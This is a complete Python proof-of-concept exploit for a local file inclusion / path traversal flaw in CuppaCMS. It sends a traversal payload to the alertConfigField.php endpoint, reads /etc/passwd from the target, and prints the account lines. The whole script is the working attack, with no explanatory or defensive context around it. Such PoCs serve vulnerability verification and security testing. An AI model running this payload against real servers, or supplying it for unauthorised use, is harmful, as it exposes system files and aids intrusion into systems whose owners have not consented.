#!/usr/bin/env python3

import requests
import argparse
import sys

def isVulnerable(url):
    
    headers = {}
    headers['Accept'] = "*/*"
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    
    u = url + "/alerts/alertConfigField.php"
    data = 'urlConfig=../../../../../../../../../../../../etc/passwd'
    
    req = requests.post(u, headers = headers, data = data)
    if('root:x' in req.text):
        print("\n[+] Dumping /etc/passwd\n")
        response = req.text
        for line in response.splitlines():
            if(":x:" in line):
                print(line)
        return True
    else: return False

def main():
    parser = argparse.ArgumentParser(description="PoC exploit for CuppaCMS 4 January 2022.")
    parser.add_argument("url", type=str, metavar="URL", help="\t\t Specify url. Ex: 'http://10.10.10.10/CuppaCMS/' ")
    
    args = parser.parse_args()
    url = args.url
    
    if(isVulnerable(url)):
        print("[+] Target is vulnerable")
    else:
        print("[-] Target is not vulnerable")

if __name__ == "__main__":
    main()